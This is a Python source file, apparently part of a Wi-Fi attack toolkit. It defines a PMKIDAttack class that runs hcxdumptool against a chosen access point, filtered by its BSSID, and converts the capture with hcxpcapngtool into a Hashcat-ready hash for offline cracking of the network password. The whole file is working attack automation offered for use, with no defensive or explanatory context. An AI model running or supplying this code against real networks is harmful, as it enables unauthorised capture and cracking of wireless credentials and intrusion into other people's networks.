import subprocess
import os
import time
from ..core.ui import print_status, print_success, print_error
from ..core.config import Config

class PMKIDAttack:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target

    def run(self):
        print_status(f"Starting PMKID attack on {self.target.essid}...")
        
        if not self.check_dependencies():
            return None

        pcap_file = os.path.join(Config.OUTPUT_DIR, f"{self.target.essid}_pmkid.pcapng")
        
        # Run hcxdumptool
        # Note: In real scenarios, this needs to run for a few minutes
        print_status("Running hcxdumptool... (Press Ctrl+C to stop after a few minutes)")
        try:
            subprocess.run([
                'hcxdumptool', '-i', self.interface,
                '-o', pcap_file,
                '--enable_status=1',
                f'--filter_bp={self.target.bssid.replace(":", "")}'
            ])
        except KeyboardInterrupt:
            print_status("Stopped hcxdumptool.")

        if os.path.exists(pcap_file):
            hash_file = pcap_file.replace(".pcapng", ".16800")
            print_status("Converting PCAP to Hashcat format...")
            subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap_file])
            
            if os.path.exists(hash_file):
                print_success(f"PMKID Hash captured: {hash_file}")
                return hash_file
        
        print_error("Failed to capture PMKID.")
        return None

    def check_dependencies(self):
        import shutil
        deps = ['hcxdumptool', 'hcxpcapngtool']
        for dep in deps:
            if not shutil.which(dep):
                print_error(f"Missing dependency: {dep}")
                return False
        return True
